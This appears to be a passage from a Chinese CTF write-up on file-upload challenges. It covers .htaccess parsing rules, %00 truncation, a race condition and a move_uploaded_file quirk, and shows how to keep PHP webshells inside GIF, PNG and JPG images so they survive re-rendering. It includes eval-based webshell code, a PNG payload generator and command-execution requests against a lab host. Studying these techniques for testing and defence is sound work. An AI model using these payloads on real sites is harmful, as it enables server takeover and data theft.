+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/160361194314.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/160361194314.png" alt="img"></a></p>
+<p>因为题目是考擦 htaccess 这个上传知识点，所以先准备一个解析规则：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>
+<p>然后先上传这个 .htaccess 文件到服务器的 upload 目录下：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036846984498.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036846984498.png" alt="img"></a></p>
+<p>这表示将 upload 目录下的所有 png 图片都当做 php 来解析，然后再上传一个 shell.png 即可：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036847615642.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036847615642.png" alt="img"></a></p>
+<p>此时这个 shell.png 就已经被当做 PHP 解析了：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036122801854.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036122801854.png" alt="img"></a></p>
+<h1 id="古老的漏洞-1"><a href="#古老的漏洞-1" class="headerlink" title="古老的漏洞 - 1"></a>古老的漏洞 - 1</h1><p>本题依然在题目中科普了 00 截断是啥，以及 00 截断的利用条件：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036124585228.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036124585228.png" alt="img"></a></p>
+<p>00 截断多配合路径来截断，我们来抓包看看应该是存在路径信息的，然后直接在路径后面使用 %00 来截断一下就可以成功绕过，为啥 %00 直接就可以绕过了呢？这是因为路径信息是从 GET 方式传递个后端的，这样默认会进行一次 URL 解码，%00 解码后就是空字节：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036847876825.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036847876825.png" alt="img"></a></p>
+<p>这样保存的文件名就是这样的效果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/apache2/htdocs/upload/new.php%00shell.png</span><br></pre></td></tr></table></figure>
+<p>因为 <code>%00</code> 起到截断的作用，所以最终会在 upload 目录下面生成 new.php 的 webshell</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036127173608.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036127173608.png" alt="img"></a></p>
+<h1 id="古老的漏洞-2"><a href="#古老的漏洞-2" class="headerlink" title="古老的漏洞 - 2"></a>古老的漏洞 - 2</h1><p>国光这一题偷懒了，没有换题目外观，不过选手们抓包就会发现这是一个 POST 型的 00 截断：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036129575787.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036129575787.png" alt="img"></a></p>
+<p>既然是 POST 型 00 截断那么就直接抓包吧，需要在 BP 里面写一个 %00 然后再 URL 手动解码一下：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036131049530.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036131049530.png" alt="img"></a></p>
+<h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>本题是一个条件竞争漏洞，也在题目中给了关键的功能代码贴图，以及给了解题思路了：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036135842482.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036135842482.png" alt="img"></a></p>
+<p>条件竞争的话稍微和正常的上传姿势不一样，先把题目中给的 webshell 信息复制出来备用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;xiao.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后先上传 shell.php 文件：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036848394730.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036848394730.png" alt="img"></a></p>
+<p>BP 抓取这个数据包然后发送到 Intruder 测试器中使用 NULL 空值无限爆破：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036138407749.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036138407749.png" alt="img"></a></p>
+<p>然后抓取访问 shell.php 的数据包：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTPGET /upload/shell.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: vul.xps.com:<span class="number">30009</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.14</span>; rv:<span class="number">56.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">56.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br></pre></td></tr></table></figure>
+<p>依然使用 NULL 空值爆破：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036140058678.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036140058678.png" alt="img"></a></p>
+<p>最后成功在服务器的 upload 目录下生成 xiao.php 里的内容就是一个标准的 webshell：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036153403524.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036153403524.png" alt="img"></a></p>
+<h1 id="move-uploaded-file-缺陷"><a href="#move-uploaded-file-缺陷" class="headerlink" title="move_uploaded_file 缺陷"></a>move_uploaded_file 缺陷</h1><p>这一题取材于 upload-labs 后面新增的题目：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/1603615449643.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/1603615449643.png" alt="img"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)</span><br></pre></td></tr></table></figure>
+<p>当 <code>$img_path</code> 可控的时候，还会忽略掉 <code>$img_path</code> 后面的 <code>/.</code> ，这一点发现最早是 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.smi1e.top/">Smile</a> 师傅于 2019 年 2 月份提出来的，TQL !!! 既然知道 move_uploaded_file 的这个小缺陷的话，这样既可直接 Getshell：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036161031022.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036161031022.png" alt="img"></a></p>
+<h1 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h1><p><code>imagecreatefrom</code> 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的，另外这一题我特意还给了查看提示的按钮：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/1603616269318.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/1603616269318.png" alt="img"></a></p>
+<p>点击这个查看提示会出现如下页面：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036164852192.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036164852192.png" alt="img"></a></p>
+<p>注意 URL 发生了变化，没错这里是一个文件包含漏洞，这样包含选手们逃避渲染上传后的图片的话就可以直接 getshell 了：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036165628118.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036165628118.png" alt="img"></a></p>
+<p>接下来要总结一下二次渲染的细节了，这也是耗费时间写本文的主要动力之一，因为上面的那些知识点都比较常规，这个二次渲染的细节国光我一直都没有深入总结过，正好就放这里总结一下。</p>
+<h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>渲染前后的两张 GIF，没有发生变化的数据库部分直接插入 Webshell 即可</p>
+<p>首先准备一张迷你的 GIF</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036176592096.gif"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036176592096.gif" alt="img"></a></p>
+<p>然后上传到目标网站上面渲染一下再导出：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036252666623.gif"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036252666623.gif" alt="img"></a></p>
+<p>使用 010Editor 打开这两个文件，在 「Tools」选项下面找到「Compare Files」即可对比两个文件内容：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/1603625929446.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/1603625929446.png" alt="img"></a></p>
+<p>对比的效果如下，其中灰的部分就是内容一致的部分：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036266297353.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036266297353.png" alt="img"></a></p>
+<p>那么只需要将 PHP 代码插入到灰色的部分即可：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036267273505.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036267273505.png" alt="img"></a></p>
+<p>修改后的 gif 图片如下：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036267469060.gif"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036267469060.gif" alt="img"></a></p>
+<p>然后上传到目标网站上面渲染一下再导出：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036268187614.gif"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036268187614.gif" alt="img"></a></p>
+<p>此时查看一下发现我们的 payload 内容依然存在：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036850183974.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036850183974.png" alt="img"></a></p>
+<h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>PNG 没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块。首先准备一个 PNG 图片：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036276956867.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036276956867.png" alt="img"></a></p>
+<p>两次渲染后对比一下，发现除了 PNG 文件头，其他部分全都不一致：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036285349399.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036285349399.png" alt="img"></a></p>
+<p>看来使用 GIF 那种思路是行不通的了。PNG 的解决方法继续往下面看。</p>
+<h3 id="写入-PLTE-数据块"><a href="#写入-PLTE-数据块" class="headerlink" title="写入 PLTE 数据块"></a>写入 PLTE 数据块</h3><p>关于实现细节以前乌云知识库的一篇文章写的很详细，感兴趣的朋友可以阅读看看：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://wooyun.x10sec.org/static/drops/tips-16034.html">WooYun 乌云 - php imagecreatefrom* 系列函数之 png</a></p>
+<p>写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，实验证明只有索引图像才可以成功插入 payload，灰度和真彩色图像均以失败告终。</p>
+<p>修改索引图像插入 PHP 代码的脚本项目地址为：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py">Github - poc_png.py</a></p>
+<p>因为值有索引图像的 PNG 才可能插入 PLTE 数据块，但是我们上面准备的 PNG 并不符合要求，得需要在 PS 里面将图片模式修改为索引颜色：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036303454787.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036303454787.png" alt="img"></a></p>
+<p>修改的索引图片如下：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036304687175.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036304687175.png" alt="img"></a></p>
+<p>然后使用 Python2 运行脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc_png.py -p <span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> -o gg_shell.png old.png</span><br></pre></td></tr></table></figure>
+<p>生成新的 gg_shell.png 图片如下：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/1603630522797.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/1603630522797.png" alt="img"></a></p>
+<p>这个图片是带 payload 的：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036306183035.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036306183035.png" alt="img"></a></p>
+<p>然后上传到目标网站上面渲染一下再导出：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036307974999.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036307974999.png" alt="img"></a></p>
+<p>来检测一下我们的 payload 是否还存在了：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036344921925.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036344921925.png" alt="img"></a></p>
+<p>哎貌似不对劲：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036345974560.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036345974560.png" alt="img"></a></p>
+<p>这个字符串被渲染后貌似是顺序有点奇怪。这里国光踩了很多坑，查了很多资料网上都没有好的解决方案，最后国光<strong>将这个被目标网站渲染后的图片再上传渲染</strong>，下面是渲染后的图片：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036348898441.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036348898441.png" alt="img"></a></p>
+<p>赶紧来查看一下里面是否包含图马信息：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036348742287.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036348742287.png" alt="img"></a></p>
+<p>阿这！居然成功了，真的是功夫不负有心人呐，不枉国光我周末大半夜的在公司加班写的这篇文章了！！！泪目</p>
+<h3 id="写入-IDAT-数据块"><a href="#写入-IDAT-数据块" class="headerlink" title="写入 IDAT 数据块"></a>写入 IDAT 数据块</h3><p>PNG 也是可以写入 IDAT 数据来绕过渲染的，由于快 23.00 了国光没有多余的时间研究里面细节了，这里直接引用了先知里面提供的一个脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./shell.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>直接运行生成会在脚本目录下生成 shell.png 图片，下面是生成好的 图片：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036353722974.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036353722974.png" alt="img"></a></p>
+<p>其内容如下：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036354976650.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036354976650.png" alt="img"></a></p>
+<p>然后上传到目标网站上面渲染一下再导出：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036356271476.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036356271476.png" alt="img"></a></p>
+<p>查看一下里面的 payload 是否还存在：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036357015967.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036357015967.png" alt="img"></a></p>
+<p>依然存在的，成功绕过渲染 ，这里顺便提一下这个 shell 的使用方法，下面就不再补充了。</p>
+<p>首先获取图片的上传地址为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vul.xps.com:30010/upload/357481464.png</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/1603635794598.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/1603635794598.png" alt="img"></a></p>
+<p>利用网站本身的文件包含漏洞，尝试直接包含这个图马 ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vul.xps.com:30010/?file=./upload/357481464.png</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036358617110.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036358617110.png" alt="img"></a></p>
+<p>貌似成功了，执行命令看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vul.xps.com:30010/?0=system&amp;file=./upload/357481464.png</span><br></pre></td></tr></table></figure>
+<p>POST 内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=<span class="built_in">cat</span> /f14a4a4a4a444g</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036360607524.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036360607524.png" alt="img"></a></p>
+<h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p>JPG 也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试。</p>
+<p>这个脚本 Github 搜索一下很多项目都有这个脚本，这里国光就随便搜索拿了搜索结果第一个的项目放在本文中。</p>
+<p><strong>项目地址</strong>：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/BlackFan/jpg_payload">Github - lackFan/jpg_payload</a></p>
+<p>准备一个 jpg 图片：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036693924901.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036693924901.jpg" alt="img"></a></p>
+<p>然后上传到目标网站上面渲染一下再导出：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/1603669426842.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/1603669426842.jpg" alt="img"></a></p>
+<p>接着使用脚本来插入 payload，如果想要修改默认 payload 的话，自行修改脚本中的下部分代码：</p>
